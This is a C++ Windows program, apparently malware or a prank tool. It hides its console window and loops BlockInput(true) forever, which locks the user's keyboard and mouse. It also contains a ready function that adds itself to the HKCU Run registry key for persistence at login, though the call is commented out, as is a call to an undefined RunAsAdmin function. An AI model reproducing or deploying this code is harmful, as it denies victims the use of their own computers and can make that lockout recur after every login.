#include <windows.h>
#include <string>
#include<iostream>

using namespace std;

// A function to add a registry entry for the program
void AddToRegistry(string path, string name) {
    HKEY hkey;
    LONG regOpenResult;
    LONG regSetValueResult;

    // Open the Run key in the registry
    regOpenResult = RegOpenKeyEx(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_ALL_ACCESS, &hkey);

    // If the key does not exist, create it
    if (regOpenResult != ERROR_SUCCESS) {
        regOpenResult = RegCreateKey(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", &hkey);

    }

    if(regOpenResult==ERROR_SUCCESS){
        std::cout<<"regOpenResult successful"<<std::endl;
    }
    // Set the value of the program path
    regSetValueResult = RegSetValueEx(hkey, name.c_str(), 0, REG_SZ, (LPBYTE)path.c_str(), path.length());
    if(regSetValueResult==ERROR_SUCCESS){
        std::cout<<"regSetValueResult successful"<<std::endl;
    }
    // Close the key
    RegCloseKey(hkey);
}

// A function to get the current executable path
string GetExePath() {
    char buffer[MAX_PATH];
    GetModuleFileName(NULL, buffer, MAX_PATH);
    return string(buffer);
}

string get_executable_name()
{
    char buffer[MAX_PATH];
    GetModuleFileName(NULL, buffer, MAX_PATH);
    string path = buffer;
    size_t pos = path.find_last_of("\\/");
    return path.substr(pos + 1);
}


int main() {
    // Get the path of the current executable
    /////    string path = GetExePath();
    ////     string executable_name = get_executable_name();
    //    // Run the program as admin
    //    bool result = RunAsAdmin(path);
    //
    //    // Check the result
    //    if (result) {
    //        cout << "running as admin.\n";
    //        // Do other stuff
    //    }
    //    else {
    //        cout << "failed to run as admin.\n";
    //        // Handle the error
    //    }

    //  //  AddToRegistry(path,executable_name);

    //    sleep(3000);
    //
    //
    FreeConsole();
    while (true) {
        BlockInput(true);
    }

    return 0;
}
